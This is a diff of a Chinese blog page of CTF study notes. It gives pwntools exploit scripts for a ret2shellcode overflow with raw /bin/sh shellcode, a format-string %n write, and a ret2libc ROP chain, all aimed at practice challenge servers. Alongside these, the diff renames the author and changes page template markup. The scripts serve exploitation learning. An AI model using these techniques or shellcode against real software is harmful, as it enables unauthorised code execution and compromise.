@@ -7,9 +7,29 @@
   <meta http-equiv="expires" content="0">
   
   <title>第二周笔记 | Pdxbshx</title>
-  <meta name="author" content="pdxbshx">
+  <meta name="author" content="John Doe">
   
-  <meta name="description" content="不需要去抱怨什么|">
+  <meta name="description" content="1、题目来源—ctfhub，ret2shellcode首先进行对程序进行分析，发现程序为64位，没有开启任何保护。
+
+直接放入ida64位进行反编译：
+
+发现buf地址已知，存在栈溢出，发现没有携带system（“bin&amp;#x2F;sh”）函数 ，且由于buf地址过小，我们可以选择把shellcode放在返回地址后面，然后将返回地址给替代成shellcode的地址，exp如下：
+from pwn import *
+p = process(&#39;./pwn3&#39;)
+# p = remote(&#34;challenge-42eb06e24ab5dbd8.sandbox.ctfhub.com&#34;,24513)
+#shellcode = asm(shellcraft.amd64.sh())
+#print(shellcode)
+p.recvuntil(&#39;[&#39;)
+buf_address = p.recvuntil(&#39;]&#39;, drop = True) 
+p.recvuntil(&#39;Input someting : &#39;)
+shell=b&#34;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&#34;
+payload = b&#39;a&#39;*24 + p64(int(buf_address,16)+32) + shell
+p.sendline(payload)
+p.interactive()
+
+最后获得flag（忘记截图，在本地执行结果如下）：
+
+2、题目来源—BUUCTF，第五空间2019决赛pwn5（格式化字符串漏洞）"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -95,12 +115,6 @@
 			</a>
 		  </li>
 		  
-		  <li>
-			<a href="/atom.xml" title="Subscribe me.">
-			  <i class="fa fa-user"></i>RSS
-			</a>
-		  </li>
-		  
 		</ul>
       </div>
     </div> <!-- container -->
@@ -136,7 +150,18 @@
 <p>直接放入ida64位进行反编译：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-2.png"></p>
 <p>发现buf地址已知，存在栈溢出，发现没有携带system（“bin&#x2F;sh”）函数 ，且由于buf地址过小，我们可以选择把shellcode放在返回地址后面，然后将返回地址给替代成shellcode的地址，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&#x27;./pwn3&#x27;</span>)</span><br><span class="line"><span class="comment"># p = remote(&quot;challenge-42eb06e24ab5dbd8.sandbox.ctfhub.com&quot;,24513)</span></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.amd64.sh())</span></span><br><span class="line"><span class="comment">#print(shellcode)</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;[&#x27;</span>)</span><br><span class="line">buf_address = p.recvuntil(<span class="string">&#x27;]&#x27;</span>, drop = <span class="literal">True</span>) </span><br><span class="line">p.recvuntil(<span class="string">&#x27;Input someting : &#x27;</span>)</span><br><span class="line">shell=<span class="string">b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span> + p64(<span class="built_in">int</span>(buf_address,<span class="number">16</span>)+<span class="number">32</span>) + shell</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./pwn3'</span><span class="token punctuation">)</span>
+<span class="token comment"># p = remote("challenge-42eb06e24ab5dbd8.sandbox.ctfhub.com",24513)</span>
+<span class="token comment">#shellcode = asm(shellcraft.amd64.sh())</span>
+<span class="token comment">#print(shellcode)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'['</span><span class="token punctuation">)</span>
+buf_address <span class="token operator">=</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">']'</span><span class="token punctuation">,</span> drop <span class="token operator">=</span> <span class="token boolean">True</span><span class="token punctuation">)</span> 
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Input someting : '</span><span class="token punctuation">)</span>
+shell<span class="token operator">=</span><span class="token string">b"\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"</span>
+payload <span class="token operator">=</span> <span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">24</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>buf_address<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">32</span><span class="token punctuation">)</span> <span class="token operator">+</span> shell
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后获得flag（忘记截图，在本地执行结果如下）：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-3.png"></p>
@@ -148,7 +173,13 @@
 <p>首先我们得先检测出我们输入的参数的偏移位置：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-6.png"></p>
 <p>可以看到aaaa对应的ASCII值为61616161，我们发现aaaa对应的参数的位置为偏移10位，然后使用%10$n这个方法将变量的地址p32(0x0804c044)写入到第一个参数（偏移10位的地址）上去，exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">r = remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">25903</span>)</span><br><span class="line">payload = p32(<span class="number">0x0804c044</span>) + <span class="string">b&#x27;%10$n&#x27;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">25903</span><span class="token punctuation">)</span>
+payload <span class="token operator">=</span> p32<span class="token punctuation">(</span><span class="token number">0x0804c044</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'%10$n'</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'4'</span><span class="token punctuation">)</span>
+r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后的结果忘记截图，但已经打通：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-7.png"></p>
@@ -177,7 +208,38 @@
 <p>先用ROPgadget找一下需要用到的汇编指令的地址。</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-11.png"></p>
 <p>我们可以发现pop rdi ;ret的地址为0x00400c83,然后ret的地址为0x004006b9，构建的exp如下：</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span>*</span><br><span class="line">p=remote(<span class="string">&quot;node4.buuoj.cn&quot;</span>,<span class="number">26928</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./ciscn&quot;</span>)</span><br><span class="line">put_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">put_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">pop_addr=<span class="number">0x400c83</span></span><br><span class="line">main=<span class="number">0x400B28</span></span><br><span class="line">ret=<span class="number">0x4006b9</span></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">payload1=<span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(pop_addr)+p64(put_got)+p64(put_plt)+p64(main)</span><br><span class="line">p.recvuntil(<span class="string">&quot;encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">addr=p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>) <span class="comment">#接收puts的地址</span></span><br><span class="line">put_addr=u64(addr[:-<span class="number">1</span>].ljust(<span class="number">8</span>,<span class="string">b&#x27;\0&#x27;</span>))</span><br><span class="line"></span><br><span class="line">libc=LibcSearcher(<span class="string">&#x27;puts&#x27;</span>,put_addr)</span><br><span class="line">libcbase=put_addr-libc.dump(<span class="string">&quot;puts&quot;</span>)</span><br><span class="line">binsh=libcbase+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>) </span><br><span class="line">system=libcbase+libc.dump(<span class="string">&#x27;system&#x27;</span>) </span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvline()</span><br><span class="line">payload2=<span class="string">b&#x27;\0&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>-<span class="number">1</span>+<span class="number">8</span>)+p64(ret)+p64(pop_addr)+p64(binsh)+p64(system)</span><br><span class="line">p.recvuntil(<span class="string">&quot;encrypted\n&quot;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
+<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span><span class="token operator">*</span>
+p<span class="token operator">=</span>remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token number">26928</span><span class="token punctuation">)</span>
+
+elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./ciscn"</span><span class="token punctuation">)</span>
+put_plt<span class="token operator">=</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
+put_got<span class="token operator">=</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span>
+pop_addr<span class="token operator">=</span><span class="token number">0x400c83</span>
+main<span class="token operator">=</span><span class="token number">0x400B28</span>
+ret<span class="token operator">=</span><span class="token number">0x4006b9</span>
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+payload1<span class="token operator">=</span><span class="token string">b'\0'</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>put_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>put_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>main<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"encrypted\n"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+addr<span class="token operator">=</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\n'</span><span class="token punctuation">)</span> <span class="token comment">#接收puts的地址</span>
+put_addr<span class="token operator">=</span>u64<span class="token punctuation">(</span>addr<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+libc<span class="token operator">=</span>LibcSearcher<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>put_addr<span class="token punctuation">)</span>
+libcbase<span class="token operator">=</span>put_addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
+binsh<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'str_bin_sh'</span><span class="token punctuation">)</span> 
+system<span class="token operator">=</span>libcbase<span class="token operator">+</span>libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span> 
+
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span><span class="token punctuation">)</span>
+payload2<span class="token operator">=</span><span class="token string">b'\0'</span><span class="token operator">+</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x50</span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"encrypted\n"</span><span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
+p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <p>最后获得的flag如下：</p>
 <p><img src="https://pdxbshx-1314875511.cos.ap-beijing.myqcloud.com/2-12.png"></p>
@@ -203,13 +265,13 @@
 
     
     
-    <a href="/uncategorized/第三周笔记/" type="button" class="btn btn-default"><i
-                class="fa fa-arrow-circle-o-left"></i> 上一页</a>
+    <a href="/ret2dl-resolve-ret2VDSO/第三周笔记/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/uncategorized/简单的栈溢出/" type="button" class="btn btn-default ">下一页<i
+    <a href="/uncategorized/简单的栈溢出/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -223,7 +285,7 @@
 	<!-- comment -->
 	<!--
 <section id="comment">
-    <h2 class="title">留言</h2>
+    <h2 class="title">Comments</h2>
 
     
 </section>
@@ -264,6 +326,12 @@
 	<!-- toc -->
 	<div class="meta-widget">
 	
+	   <a data-toggle="collapse" data-target="#toc"><i class="fa fa-bars"></i></a>
+	   <div id="toc" class="toc collapse in">
+		   <span class="toc-title">Contents</span>
+			<ol class="toc-article"><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#1%E3%80%81%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90%E2%80%94ctfhub%EF%BC%8Cret2shellcode"><span class="toc-article-text">1、题目来源—ctfhub，ret2shellcode</span></a></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#2%E3%80%81%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90%E2%80%94BUUCTF%EF%BC%8C%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019%E5%86%B3%E8%B5%9Bpwn5%EF%BC%88%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%EF%BC%89"><span class="toc-article-text">2、题目来源—BUUCTF，第五空间2019决赛pwn5（格式化字符串漏洞）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-article-text">字符串漏洞知识点总结：</span></a></li></ol></li><li class="toc-article-item toc-article-level-3"><a class="toc-article-link" href="#3%E3%80%81%E9%A2%98%E7%9B%AE%E6%9D%A5%E6%BA%90%E2%80%94BUUCTF%EF%BC%8Cciscn-2019-c-1%EF%BC%88ret2libc%EF%BC%89"><span class="toc-article-text">3、题目来源—BUUCTF，ciscn_2019_c_1（ret2libc）</span></a><ol class="toc-article-child"><li class="toc-article-item toc-article-level-4"><a class="toc-article-link" href="#%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="toc-article-text">补充知识点：</span></a></li></ol></li></ol>
+		</div>
+	
 	</div>
 	
     <hr>
@@ -288,7 +356,7 @@
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2023 pdxbshx's Blog
+  &copy; 2023 John Doe's Blog
   
       powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
 </p>
